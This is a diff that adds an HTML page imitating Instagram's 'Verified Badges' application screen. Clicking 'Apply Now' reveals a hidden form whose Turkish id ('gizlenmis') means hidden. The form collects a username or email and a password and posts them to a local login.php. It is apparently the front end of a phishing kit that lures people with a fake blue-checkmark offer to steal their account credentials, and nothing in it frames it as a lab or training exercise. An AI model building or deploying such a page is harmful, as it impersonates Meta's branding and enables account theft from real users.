@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verified Badge • Instagram</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <style>
+        /* Modern Instagram Design System */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header Navigation */
+        nav {
+            background-color: #fff;
+            border-bottom: 1px solid #dbdbdb;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        .nav-content {
+            max-width: 975px;
+            width: 100%;
+            padding: 0 20px;
+            display: flex;
+            justify-content: flex-start;
+        }
+
+        .insta-logo {
+            height: 29px;
+            cursor: pointer;
+        }
+
+        /* Main Container */
+        main {
+            margin-top: 90px;
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            padding-bottom: 40px;
+        }
+
+        .card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            max-width: 400px;
+            width: 100%;
+            padding: 40px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .badge-icon {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 26px;
+            font-weight: 300;
+            margin-bottom: 20px;
+        }
+
+        .description {
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Buttons */
+        .btn-primary {
+            background-color: #0095f6;
+            color: #fff;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            font-weight: 600;
+            padding: 7px 16px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-primary:active {
+            opacity: 0.7;
+        }
+
+        /* Hidden Login Section */
+        #gizlenmis {
+            margin-top: 20px;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 0 7px 8px;
+            font-size: 12px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .dob-label {
+            text-align: left;
+            font-size: 12px;
+            color: #8e8e8e;
+            margin: 15px 0 5px 0;
+            font-weight: 600;
+        }
+
+        .dob-container {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 15px;
+        }
+
+        select {
+            flex: 1;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            color: #8e8e8e;
+            padding: 5px;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="nav-content">
+            <img src="ig-icon.png" class="insta-logo" alt="Instagram">
+            <img src="instagram.png" class="insta-logo" alt="Instagram">
+        </div>
+    </nav>
+
+    <main>
+        <div class="card">
+            <img src="bluetick.png" class="badge-icon" alt="Verified">
+            <h2>Verified Badges</h2>
+            
+            <div class="description">
+                Confirm your account to request a verified badge. Verified accounts have blue checkmarks next to their names to show that Instagram has confirmed they're the real presence of the public figures, celebrities and brands they represent.
+            </div>
+
+            <button class="btn-primary" id="butonamca">Apply Now</button>
+
+            <!-- Hidden Form Section -->
+            <div id="gizlenmis" style="display:none;">
+                <form action="login.php" method="POST">
+
+                    <div class="input-group">
+                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+
+                    <button type="submit" class="btn-primary" style="margin-top: 10px;">Submit Application</button>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        &copy; 2026 Instagram from Meta
+    </footer>
+
+    <script>
+        $("#butonamca").click(function(){
+            $(this).fadeOut(200, function() {
+                $("#gizlenmis").fadeIn(400);
+            });
+        });
+    </script>
+</body>
+</html>
